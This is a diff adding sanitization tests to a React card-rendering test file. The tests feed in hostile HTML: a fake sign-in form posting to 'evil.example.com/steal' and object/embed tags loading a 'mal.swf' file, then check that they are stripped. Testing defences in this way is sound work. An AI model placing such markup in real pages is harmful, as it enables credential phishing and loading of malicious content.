@@ -107,6 +107,42 @@ describe('renderCardHtml', () => {
     );
   });
 
+  // Passthrough blocks put author-written HTML straight into the card, so the
+  // sanitizer is the only thing between a card and a fake login box.
+  describe('sanitization', () => {
+    it('drops forms and their controls but keeps the prose around them', () => {
+      const { container } = render(
+        <Content
+          html={
+            '<form action="https://evil.example.com/steal">' +
+            '<input value="data"><button>Sign in</button>' +
+            '</form><p>Safe</p>'
+          }
+        />,
+      );
+
+      expect(container.querySelector('form')).toBeNull();
+      expect(container.querySelector('input')).toBeNull();
+      expect(container.querySelector('button')).toBeNull();
+      expect(screen.getByText('Safe')).toBeInTheDocument();
+    });
+
+    it('drops plugin embeds', () => {
+      const { container } = render(
+        <Content
+          html={
+            '<object data="https://evil.example.com/mal.swf"></object>' +
+            '<embed src="https://evil.example.com/mal.swf"><p>Safe</p>'
+          }
+        />,
+      );
+
+      expect(container.querySelector('object')).toBeNull();
+      expect(container.querySelector('embed')).toBeNull();
+      expect(screen.getByText('Safe')).toBeInTheDocument();
+    });
+  });
+
   // In-app anchors become react-router <Link>s, so what is asserted here is the
   // path the router ends up on. Anything left to the browser keeps its original
   // href and does not move the location.
